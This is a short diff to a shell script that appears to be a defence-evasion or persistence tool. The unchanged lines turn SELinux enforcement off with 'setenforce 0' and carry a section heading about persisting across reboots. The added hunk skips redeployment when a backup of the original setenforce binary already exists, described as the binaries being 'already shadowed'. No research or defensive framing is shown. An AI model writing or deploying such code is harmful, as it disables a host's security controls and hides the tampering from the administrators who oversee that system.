@@ -13,6 +13,12 @@ if [[ -z "$SETENFORCE" ]]; then
     exit 0
 fi
 
+# idempotency — if backup already exists, binaries are already shadowed
+if [[ -f "${BACKUP_DIR}/setenforce.orig" ]]; then
+    echo "[!] already deployed — skipping (backup exists at ${BACKUP_DIR}/setenforce.orig)"
+    exit 0
+fi
+
 "$SETENFORCE" 0 2>/dev/null
 
 # --- persist across reboots ---
